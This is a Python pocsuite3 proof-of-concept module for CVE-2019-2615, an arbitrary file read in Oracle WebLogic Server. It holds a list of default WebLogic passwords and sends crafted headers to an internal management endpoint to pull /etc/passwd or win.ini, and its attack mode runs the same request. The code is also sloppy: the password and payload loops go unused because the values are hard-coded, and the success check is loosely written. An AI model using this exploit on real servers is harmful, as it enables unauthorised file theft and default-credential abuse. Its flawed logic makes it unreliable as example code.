#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite3.api import POCBase, Output
from pocsuite3.api import register_poc
import requests
passwd = ['weblogic','weblogic1','weblogic10','weblogic123','Oracle@123']

payload = ["c:\\windows\win.ini","/etc/passwd"]
class TestPOC(POCBase):
    name = 'OracleWeblogic_ArbitraryFileRead_CVE-2019-2615'
    vulID = 'CVE-2019-2615'  
    author = ['debug']
    vulType = 'ArbitraryFileRead'
    version = '1.0'    # default version: 1.0
    references = ['http://www.s3cur1ty.de/m1adv2013-003']
    desc = '''
           Oracle Fusion Middleware的Oracle WebLogic Server组件中的漏洞
           攻击者可以在已知用户名密码的情况下读取WebLogic服务器中的任意文件
           '''

    vulDate = '2018-12-14'
    createDate = '2018-12-14'
    updateDate = '2018-12-14'

    appName = 'Oracle Weblogic'
    appVersion = '10.3.6.0.0,12.1.3.0.0,12.2.1.3.0'
    appPowerLink = ''
    samples = ['']   
    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result={}
        url=self.url+ "/bea_wls_management_internal2/wl_management"
        for password in passwd:
            for pay in payload:
                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language":"en-US,en;q=0.5",
                    "Accept-Encoding":"gzip, deflate",
                    "Connection":"close",
#                     "Cookie":"JSESSIONID=G_zQJ0KMauqwnGxJVCTngrk-ph7DH9-rFe0LFZ7Rlq-Pbrc3rJwz!399952235; ADMINCONSOLESESSION=SL1KfzxcmJl8mz7hYrM3t9tt28yzLTQjT9gfNd3TblnQ2lVQNcTr!694835496",
                    "username":"weblogic",
                    "password":'Oracle@123',
                    'wl_request_type': "wl_jsp_refresh_request",
                    'adminPath': "/etc/passwd", 
                    "Upgrade-Insecure-Requests":"1"
                    }
                req = requests.get(url=url,headers=headers)
                print(req)
                if  req.status_code == 200 and 'root' in req.text or 'Mail' in req.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url+ ' OracleWeblogic_ArbitraryFileRead_CVE-2019-2615' + ' is exist!'
                    break
        return self.parse_output(result)
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)
